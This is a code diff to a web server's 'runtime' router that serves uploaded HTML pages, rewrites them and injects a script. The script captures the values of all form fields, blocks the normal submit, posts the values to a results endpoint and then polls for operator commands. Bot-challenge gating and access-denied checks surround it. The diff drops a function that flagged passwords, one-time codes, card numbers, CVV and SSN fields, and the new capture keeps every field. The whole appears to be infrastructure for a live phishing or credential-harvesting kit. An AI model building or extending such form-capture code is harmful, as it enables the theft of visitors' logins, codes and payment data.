@@ -32,6 +32,13 @@ import { clearSourceProofCookie, readSourceProofCookie, setSourceProofCookie } f
 import { runtimePackageForUserPage, runtimeScreenForFile } from "../services/runtimeScreens.js";
 import { clientIp } from "../services/clientIp.js";
 import { brandingImageForPackage } from "../services/runtimeBranding.js";
+import {
+  instrumentResultFields,
+  serverNormalizedFieldManifest,
+  signResultFieldManifest,
+  trustedResultManifestFromPersistent,
+  verifyResultFieldManifest
+} from "../services/resultCapture.js";
 
 export const runtimeRouter = Router();
 const accessDeniedMessage = "ACCESS DENIED";
@@ -267,13 +274,18 @@ function runtimePageUrl(userPageId, file) {
   return `/api/runtime/source?${params.toString()}`;
 }
 
-function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security = {}, forceTurnstile = false }) {
+function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName = "", fieldManifest = null, security = {}, forceTurnstile = false }) {
   const turnstile = publicTurnstileConfig(security);
   const turnstileConfig = {
     enabled: Boolean((turnstile.enabled || forceTurnstile) && turnstile.siteKey),
     siteKey: turnstile.siteKey || ""
   };
-  const rewritten = html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
+  const fieldCapture = instrumentResultFields(html, { screenFile: file, screenKey: screenId || file });
+  const trustedFieldManifest = fieldManifest?.fields?.length
+    ? trustedResultManifestFromPersistent(fieldManifest, { screenFile: file, screenId: screenId || file })
+    : fieldCapture.manifest;
+  const fieldManifestToken = signResultFieldManifest(trustedFieldManifest, { userPageId });
+  const rewritten = fieldCapture.html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
     const resolved = resolveRelativePath(file, value);
     if (!resolved) return match;
     if (/\.html?$/i.test(resolved)) {
@@ -291,12 +303,24 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
     screenName: ${JSON.stringify(screenName || file)},
     sessionId: getSessionId(),
     turnstile: ${JSON.stringify(turnstileConfig)},
-    challengeProof: ""
+    challengeProof: "",
+    fieldManifestToken: ${JSON.stringify(fieldManifestToken)},
+    fieldManifestRevision: ${JSON.stringify(trustedFieldManifest.revision)}
   };
   const apiBase = window.location.pathname.indexOf("/api/runtime/") === 0 ? "/api/runtime" : "/api";
 
   function endpoint(path) {
     return apiBase + "/" + String(path || "").replace(/^\\/+/, "");
+  }
+
+  function secureTransport(url) {
+    try {
+      const target = new URL(url, window.location.href);
+      return target.protocol === "https:"
+        || ["localhost", "127.0.0.1", "::1"].includes(target.hostname);
+    } catch (error) {
+      return false;
+    }
   }
 
   function sameLocation(targetUrl) {
@@ -330,61 +354,67 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
 
   let lastSubmitter = null;
 
-  function isSensitiveField(field, input) {
-    const text = [
-      field,
-      input && input.name,
-      input && input.id,
-      input && input.type,
-      input && input.autocomplete,
-      input && input.placeholder,
-      input && input.getAttribute && input.getAttribute("aria-label")
-    ].filter(Boolean).join(" ").toLowerCase();
-    return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
+  function normalizedFieldType(input) {
+    if (!input) return "text";
+    if (input.tagName === "SELECT") return input.multiple ? "select-multiple" : "select";
+    if (input.tagName === "TEXTAREA") return "textarea";
+    return String(input.getAttribute("data-deuce-field-type") || input.type || "text").toLowerCase();
   }
 
-  function fieldLabel(input) {
-    const escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
-    const label = escapedId ? document.querySelector('label[for="' + escapedId + '"]') : null;
-    const wrapperLabel = input.closest && input.closest("label");
-    return input.getAttribute("aria-label")
-      || input.placeholder
-      || (label && label.textContent)
-      || (wrapperLabel && wrapperLabel.textContent)
-      || input.name
-      || input.id
-      || "Field";
+  function fallbackFieldId(input, index) {
+    const source = String(input.name || input.id || input.getAttribute("aria-label") || input.placeholder || "field")
+      .toLowerCase()
+      .replace(/[^a-z0-9]+/g, "_")
+      .replace(/^_+|_+$/g, "")
+      .slice(0, 48) || "field";
+    return "client_" + source + "_" + String(index + 1);
   }
 
-  function safeFormData(form) {
-    const data = {};
-    const fields = Array.from(form.elements || []).filter(function (input) {
-      return input && !input.disabled && !["submit", "button", "reset", "file"].includes(String(input.type || "").toLowerCase());
-    });
-    fields.forEach(function (input) {
-      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
-      const key = fieldLabel(input).replace(/\s+/g, " ").trim();
-      if (!key) return;
-      data[key] = input.value || "";
-    });
-    data._fieldCount = fields.length;
-    return data;
+  function capturedFieldValue(input, groupedInputs) {
+    const type = normalizedFieldType(input);
+    if (type === "checkbox" || type === "radio") {
+      const selected = groupedInputs.filter(function (item) { return item.checked; }).map(function (item) { return item.value || "on"; });
+      if (type === "radio") return selected[0] || "";
+      return selected;
+    }
+    if (type === "select-multiple") {
+      return Array.from(input.selectedOptions || []).map(function (option) { return option.value || ""; });
+    }
+    return input.value || "";
   }
 
-  function safeInputData(inputs) {
-    const data = {};
-    const fields = Array.from(inputs || []).filter(function (input) {
-      const type = String(input && input.type || "").toLowerCase();
-      return input && !input.disabled && !["submit", "button", "reset", "file", "hidden"].includes(type);
+  function captureFields(inputs) {
+    const eligible = Array.from(inputs || []).filter(function (input) {
+      const type = normalizedFieldType(input);
+      return input && !input.disabled && !["submit", "button", "reset", "file", "hidden", "image"].includes(type);
     });
-    fields.forEach(function (input) {
-      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
-      const key = fieldLabel(input).replace(/\s+/g, " ").trim();
-      if (!key) return;
-      data[key] = input.value || "";
+    const grouped = new Map();
+    eligible.forEach(function (input, index) {
+      const id = input.getAttribute("data-deuce-field-id") || fallbackFieldId(input, index);
+      if (!grouped.has(id)) grouped.set(id, []);
+      grouped.get(id).push(input);
     });
-    data._fieldCount = fields.length;
-    return data;
+    return Array.from(grouped.entries()).map(function (entry) {
+      const id = entry[0];
+      const groupedInputs = entry[1];
+      const input = groupedInputs[0];
+      return {
+        id: id,
+        type: normalizedFieldType(input),
+        value: capturedFieldValue(input, groupedInputs)
+      };
+    });
+  }
+
+  function captureEnvelope(inputs, scopeId) {
+    return {
+      version: 1,
+      source: "signed-runtime",
+      manifestToken: runtime.fieldManifestToken,
+      manifestRevision: runtime.fieldManifestRevision,
+      scopeId: scopeId || "page",
+      fields: captureFields(inputs)
+    };
   }
 
   function nearestInputScope(control) {
@@ -546,7 +576,9 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
   }
 
   function send(path, payload) {
-    return fetch(endpoint(path), {
+    const target = endpoint(path);
+    if (!secureTransport(target)) return Promise.resolve(null);
+    return fetch(target, {
       method: "POST",
       keepalive: true,
       headers: { "Content-Type": "application/json" },
@@ -564,10 +596,10 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
     }).catch(function () { return null; });
   }
 
-  function sendResultPayload(data, captureMode) {
+  function sendResultPayload(capture, captureMode) {
     return send("results", {
       screen: pageLabel(),
-      data: data,
+      capture: capture,
       flow: [runtime.pageId],
       userAgent: navigator.userAgent
     }).then(function (response) {
@@ -603,9 +635,9 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
       return;
     }
     setWaitingState(form, submitter);
-    const data = safeFormData(form);
+    const capture = captureEnvelope(form.elements || [], form.getAttribute("data-deuce-form-id") || "page");
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
-    sendResultPayload(data, "form");
+    sendResultPayload(capture, "form");
     send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
     window.setTimeout(checkCommand, 400);
   }
@@ -614,8 +646,8 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
     if (!control || control.getAttribute("data-deuce-waiting") === "true") return;
     if (!controlLooksLikeSubmit(control)) return;
     const inputs = fallbackInputsFor(control);
-    const data = safeInputData(inputs);
-    if (!data._fieldCount) return;
+    const capture = captureEnvelope(inputs, "page");
+    if (!capture.fields.length) return;
     if (event) {
       event.preventDefault();
       event.stopImmediatePropagation();
@@ -623,7 +655,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenName = "", security 
     control.setAttribute("data-deuce-waiting", "true");
     setControlWaiting(control);
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
-    sendResultPayload(data, "fallback");
+    sendResultPayload(capture, "fallback");
     send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
     window.setTimeout(checkCommand, 400);
   }
@@ -767,7 +799,9 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   res.send(rewriteRuntimeHtml(html, {
     userPageId: context.page.id,
     file,
+    screenId: runtimeScreen?.id || "",
     screenName: runtimeScreen?.name || file,
+    fieldManifest: runtimeScreen?.fieldManifest || null,
     security: context.page.securityConfig || {},
     forceTurnstile: Boolean(securityDecisionResult.challengeRequired)
   }));
@@ -942,13 +976,32 @@ runtimeRouter.post("/results", async (req, res) => {
     res.status(403).json({ error: accessDeniedMessage });
     return;
   }
+  let fieldManifest = null;
+  if (req.body?.capture) {
+    if (req.body.capture.source === "signed-runtime") {
+      try {
+        fieldManifest = verifyResultFieldManifest(req.body.capture.manifestToken, {
+          userPageId: context.page.id,
+          screenFile: req.body.screenFile
+        });
+        if (req.body.capture.manifestRevision !== fieldManifest.revision) {
+          throw new Error("Result field manifest revision mismatch");
+        }
+      } catch {
+        res.status(400).json({ error: "Result field manifest is invalid or expired" });
+        return;
+      }
+    } else {
+      fieldManifest = serverNormalizedFieldManifest(req.body.capture, { screenFile: req.body.screenFile });
+    }
+  }
   const result = await savePageResult({
     ...req.body,
     userPageId: context.page.id,
     pageId: context.page.slug,
     pageName: context.page.name,
     hostname: context.clientHost || req.body?.hostname
-  }, context.ip, req.headers["user-agent"]);
+  }, context.ip, req.headers["user-agent"], { fieldManifest });
   res.status(201).json({ result });
 });
 
